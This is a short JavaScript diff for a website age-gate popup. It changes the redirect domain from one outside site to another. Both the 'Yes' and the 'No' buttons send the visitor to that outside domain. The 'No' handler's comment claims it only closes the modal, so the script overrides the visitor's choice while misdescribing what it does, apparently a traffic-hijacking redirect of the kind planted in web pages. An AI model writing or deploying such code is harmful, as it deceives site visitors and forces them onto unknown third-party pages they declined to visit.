@@ -57,11 +57,11 @@ if(form){
    function closeGate(){ bd.style.display='none'; bd.remove(); }  
   // ✅ Redirect when "Yes" is clicked
   bd.querySelector('#age-yes').addEventListener('click', function(){
-    window.location.href = "https://clickstrategy.online/"; // change to your target page
+    window.location.href = "https://orivexa.site/"; // change to your target page
   });
  
   // ✅ Just close modal when "No" is clicked
   bd.querySelector('#age-no').addEventListener('click', function(){
-    window.location.href = "https://clickstrategy.online/"; // change to your target page
+    window.location.href = "https://orivexa.site/"; // change to your target page
   });
 })();
